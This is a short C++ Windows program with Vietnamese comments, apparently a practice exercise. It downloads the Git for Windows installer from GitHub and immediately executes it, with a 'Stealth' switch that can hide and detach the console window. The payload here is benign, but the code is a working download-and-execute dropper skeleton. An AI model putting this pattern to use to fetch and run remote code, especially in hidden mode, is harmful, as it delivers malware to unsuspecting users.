#include <Windows.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <time.h>
#include <map>
#include <string>
#pragma comment(lib, "urlmon.lib")

#define visible

using namespace std;

void Stealth() {
// Tao 1 cua so moi

#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	FreeConsole();
#endif
}

void Executing(LPWSTR cmdLine) {
// Tao mot Process chay file vua download = cach su dung ham CreateProcessW
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(NULL, cmdLine, NULL,
		NULL, FALSE, 0, NULL,
		NULL, &si, &pi);
	
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void Downloader()
{
// Su dung API URLDownloadToFile de download file executeable (vi du la git)
	string filePath = "D:\\DownloadFile\\git.exe"; //Phai nhap ten file FUCKKK
	string URL = "https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe";

	wstring tempUrl = wstring(URL.begin(), URL.end());
	wstring tempPath = wstring(filePath.begin(), filePath.end());

	LPCWSTR wideStringUrl = tempUrl.c_str();
	LPCWSTR wideStringPath = tempPath.c_str();

	if (S_OK == (URLDownloadToFile(NULL, wideStringUrl, wideStringPath, 0, NULL))) {
		cout << "Download: Successful!!!" << '\n';
		cout << "Start Executing....." << '\n';
		Executing(&tempPath[0]);
	}
	else {
		cout << "Download: Failed" << '\n';
	}
}

int main()
{
	Stealth();

	Downloader();
}
